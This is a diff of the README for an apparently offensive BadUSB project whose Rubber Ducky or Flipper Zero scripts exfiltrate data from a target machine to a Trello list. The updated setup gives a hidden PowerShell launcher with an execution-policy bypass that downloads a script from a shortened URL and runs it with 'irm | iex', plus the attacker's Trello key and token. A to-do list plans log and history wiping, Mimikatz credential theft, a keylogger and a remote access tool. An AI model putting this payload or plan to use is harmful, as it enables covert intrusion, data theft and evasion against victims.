@@ -4,7 +4,7 @@
 
 This project is a BadUSB mix of some rubber ducky scripts.
 
-- **Version:** [1.0]
+- **Version:** [1.1]
 - **Average Time :** 
   - W1ns1d3r_f4st_Tr3ll0 : 3 Secs
   - W1ns1d3r_st4gg3d_Tr3ll0 : 30 secs
@@ -67,7 +67,6 @@ ________________________________________________________________________________
   - **The ID of the list you want to post into --> Step 1.6**
   - **An API Key --> Step 1.4.3**
   - **A Token --> Step 1.4.5**
-  - **Host your file on internet --> Step 3**
 
 - **Setup Guide :**
   - **1 - Creating account and setup informations**
@@ -91,22 +90,30 @@ ________________________________________________________________________________
       - 1.6.1 - For linux users, go for the idlist.sh
       - 1.6.2 - For windows users, go for the idlist.ps1
 
-  - **2 - Once you have the idlist, the API key and the token, you need to modify the script or the "stage2.ps1" file**
-    - 2.1 - Modifying the script, you need to add this into it ( Upload-Trello function ): 
-      - $idList = "THE_ID_LIST"
-      - $key = "YOUR_API_KEY_FROM"
-      - $token = "YOUR_TOKEN_FROM"
+  - **2 - Once you have the idlist, the API key and the token, you need to modify the "launcher" [.txt] file**
+    - 2.1 - You need to go to the script and look for a line like this : ```"STRING powershell -w h -NoP -Ep Bypass $idList='';$key='';$token='';irm https://shorturl.at/gpvF5 | iex"```
+    - 2.2 - Then, you need to add those informations : 
+      - 2.2.1 - ```$idList=''``` your id list, that you've got from the *idlist script* **Step 1.6**
+      - 2.2.2 - ```$key=''``` your API Key **Step 1.4.3**
+      - 2.2.3 - ```$token=''``` your Token **Step 1.4.5**
 
-  - **3 - You need to host your file where it can be read in raw**
-      - 3.1 - Easiest way, you can host it on github, and the, via the "RAW" button, you can view the raw file.
-        - 3.1.1 - Replace the link to raw file with the link in the [.txt] file ( you can use shorturl to get a shorter link )
-      - 3.2 - Host the raw file wherever you want on a webserver accesible via internet.
-        - 3.2.1 - Replace the link to raw file with the link in the [.txt] file ( you can use shorturl to get a shorter link )
+    - **3 - Put the modified [.txt] file into your Rubber Ducky or Flipper Zero**
+      - Instructions of 
 
-    - **4 - Put the modified [.txt] file into your Rubber Ducky or Flipper Zero**
-
-    - **5 - Enjoy !**
+    - **4 - Enjoy !**
 
 # Releases
 
 - **Version [1.0]** - *10/02/2024*
+- **Version [1.1]** - *12/02/2024*
+
+
+# To do : 
+
+- Add a folder with each function and explain how they work.
+- Create a version that supports admin rights and add : 
+  - Add the trash folder erasing
+  - Add the powershell history erasing
+  - Add Mimikatz password recovery
+  - Add keylogger
+  - Add a RAT ( Remote Access Toolkit ) installation and configuration
